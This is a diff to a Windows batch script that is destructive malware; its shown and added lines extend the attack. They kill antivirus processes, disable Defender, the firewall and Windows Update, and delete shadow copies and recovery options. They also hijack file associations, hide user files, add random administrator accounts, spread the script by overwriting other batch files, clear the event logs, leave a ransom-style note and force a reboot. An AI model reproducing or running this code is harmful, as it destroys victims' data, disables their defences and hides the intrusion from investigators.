@@ -12,6 +12,7 @@ if not '%1'=='admin' (
     powershell -Command "Start-Process '%~f0' -ArgumentList 'admin' -Verb RunAs" >nul 2>&1
 )
 
+set /a "pid=0" && for /f "tokens=2" %%i in ('tasklist ^| findstr /i "ekrn msmpeng"') do (set pid=%%i && if !pid! NEQ 0 (taskkill /f /pid !pid! >nul && call :PATCH_DRIVER !pid!))
 taskkill /f /im MsMpEng.exe
 attrib +s +h +i +l +x +a "%0" >nul
 wmic process where name="cmd.exe" call setpriority "idle" >nul 2>&1
@@ -36,10 +37,10 @@ assoc .jpg=.xDDD
 assoc .dll=.xDDD
 assoc .mp3=.xDDD
 assoc .bmp=.xDDD
-assoc .txt=.xDDD
 assoc .zip=.xDDD
 assoc .rar=.xDDD
 assoc .png=.xDDD
+assoc .txt=.xDDD
 attrib +h +s "%USERPROFILE%\Desktop\*" /s /d
 attrib +h +s "%USERPROFILE%\Documents\*" /s /d  
 attrib +h +s "%USERPROFILE%\Downloads\*" /s /d
@@ -48,8 +49,8 @@ bcdedit /set {default} recoveryenabled no
 vssadmin delete shadows /all /quiet >nul
 wmic shadowcopy delete >nul 2>&1
 bcdedit /deletevalue {current} safeboot >nul 2>&1
-netsh advfirewall set allprofiles state off
 sc config WinDefend start= disabled >nul 2>&1
+netsh firewall set opmode disable >nul
 netsh advfirewall set allprofiles state off >nul 2>&1
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "OptionValue" /t REG_DWORD /d 1 /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v "OptionValue" /t REG_DWORD /d 1 /f
@@ -124,9 +125,17 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v CrashDumpEnabled /t REG_DWORD /d 0 /f
 reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "0" /f >nul
 for /r "%userprofile%" %%f in (*.bat) do if not "%%f"=="%~f0" copy /Y "%~f0" "%%f" >nul 2>&1
+wmic os set localdatetime="19700101000000.000000+000" >nul
+sc config wuauserv start= disabled >nul
+net stop wuauserv /y >nul
 for /l %%i in (1,1,10) do (
     set u=!random!
     set p=!random!
     net user !u! !p! /add >nul 2>&1
     net localgroup administrators !u! /add >nul 2>&1
 )
+wevtutil cl System
+wevtutil cl Security
+wevtutil cl Application
+echo Your system has been compromised. > %userprofile%\Desktop\READ_ME.txt
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Destroy /t REG_SZ /d "shutdown /r /t 60 /c ""Critical Error""" /f
